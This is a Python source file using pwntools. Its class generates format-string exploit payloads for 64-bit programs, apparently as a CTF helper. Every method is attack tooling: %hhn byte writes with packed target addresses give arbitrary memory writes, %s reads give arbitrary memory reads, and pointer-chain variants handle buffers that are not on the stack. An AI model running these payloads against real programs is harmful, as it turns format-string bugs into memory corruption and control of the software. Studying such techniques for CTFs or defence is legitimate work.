from pwn import *


class FMT:
    def __init__(self, input_offset: int, off_of_3: int, chain_ptr: tuple) -> None:
        self.input_offset = input_offset
        self.chain_ptr = chain_ptr
        self.off_of_3 = off_of_3

    @staticmethod
    def __fmt_write_single_byte(offset: int, value: int):
        if value > 255 or value < 0:
            raise Exception("target num is too big or too small for single byte")
        payload = b""
        if value != 0:
            payload += f"%{value}c".encode()
        payload += f"%{offset}$hhn".encode()

        return payload


    @staticmethod
    def __get_num_list(value, is_zxt: bool, zxt_len: int):
        now_num = value
        num_list = []
        if now_num < 0 or now_num > 0xffffffffffffffff:
            raise Exception("target_num is too large or too small")

        if now_num == 0:
            num_list.append(0)
        while now_num != 0:
            num_list.append(now_num % 0x100)
            now_num //= 0x100
        if is_zxt:
            list_len = len(num_list)
            for i in range(zxt_len - list_len):
                num_list.append(0)

        return num_list

    def fmt_64_write(self, target_addr: int, target_num: int, is_zxt: bool = False, zxt_len: int = 8):
        """
        | is_zxt:   zero extension or not
        | zxt_len:  zero extension to 'zxt_len' bit
        """
        # get the list with bytes num
        num_list = self.__get_num_list(target_num, is_zxt, zxt_len)

        payload = b""
        sum_num = 0
        tmp_len = 0xc * len(num_list)
        if tmp_len % 8 != 0:
            tmp_len += 4
        tmp_i = 0
        for i in sorted(num_list):
            if i - sum_num != 0:
                payload += b"%" + str(i - sum_num).encode() + b"c%" + str(
                    tmp_len // 8 + self.input_offset + tmp_i).encode() + b"$hhn"
                sum_num = i
            else:
                payload += b"%" + str(tmp_len // 8 + self.input_offset + tmp_i).encode() + b"$hhn"
            tmp_i += 1
        payload = payload.ljust(tmp_len, b'a')

        no_repeat_list = list(set(num_list))
        for i in sorted(no_repeat_list):
            idx_list = [j for j, x in enumerate(num_list) if x == i]
            for j in idx_list:
                payload += p64(target_addr + j)

        return payload

    def fmt_64_write_n(self, target_addr: int, target_num: int, is_zxt: bool = False, zxt_len: int = 8):
        num_list = self.__get_num_list(target_num, is_zxt, zxt_len)

        payloads = []
        for i in range(len(num_list)):
            payloads.append(self.fmt_64_write(target_addr + i, num_list[i]))
        return payloads

    def fmt_64_read(self, target_addr):
        payload = f"%{self.input_offset + 1}s".ljust(0x8, 'a').encode()
        payload += p64(target_addr)
        return payload

    def fmt_not_on_stack_64_write(self, target_addr: int, target_num: int, is_zxt: bool = False, zxt_len: int = 8):
        off_1_ptr = self.chain_ptr[2] - self.off_of_3 * 8
        low_byte = self.chain_ptr[2] % 0x100

        offset_1 = (self.chain_ptr[0] - off_1_ptr) // 8
        offset_2 = (self.chain_ptr[1] - off_1_ptr) // 8
        offset_3 = (self.chain_ptr[2] - off_1_ptr) // 8

        num_list_addr = self.__get_num_list(target_addr, False, 8)
        num_list_value = self.__get_num_list(target_num, is_zxt, zxt_len)

        payloads = []
        for i in range(1, len(num_list_addr)):
            payload = self.__fmt_write_single_byte(offset_1, low_byte + i)
            payloads.append(payload)
            payload = self.__fmt_write_single_byte(offset_2, num_list_addr[i])
            payloads.append(payload)

        payload = self.__fmt_write_single_byte(offset_1, low_byte)
        payloads.append(payload)

        for i in range(len(num_list_value)):
            payload = self.__fmt_write_single_byte(offset_2, num_list_addr[0] + i)
            payloads.append(payload)
            payload = self.__fmt_write_single_byte(offset_3, num_list_value[i])
            payloads.append(payload)

        return payloads

    def fmt_not_on_stack_64_read(self, target_addr: int):
        off_1_ptr = self.chain_ptr[2] - self.off_of_3 * 8
        low_byte = self.chain_ptr[2] % 0x100

        offset_1 = (self.chain_ptr[0] - off_1_ptr) // 8
        offset_2 = (self.chain_ptr[1] - off_1_ptr) // 8
        offset_3 = (self.chain_ptr[2] - off_1_ptr) // 8

        num_list_addr = self.__get_num_list(target_addr, False, 8)
        # num_list_value = self.__get_num_list(target_num, is_zxt, zxt_len)
        payloads = []
        for i in range(len(num_list_addr)):
            payload = self.__fmt_write_single_byte(offset_1, low_byte + i)
            payloads.append(payload)
            payload = self.__fmt_write_single_byte(offset_2, num_list_addr[i])
            payloads.append(payload)

        payload = f"%{offset_3}$s".encode()
        payloads.append(payload)

        return payloads
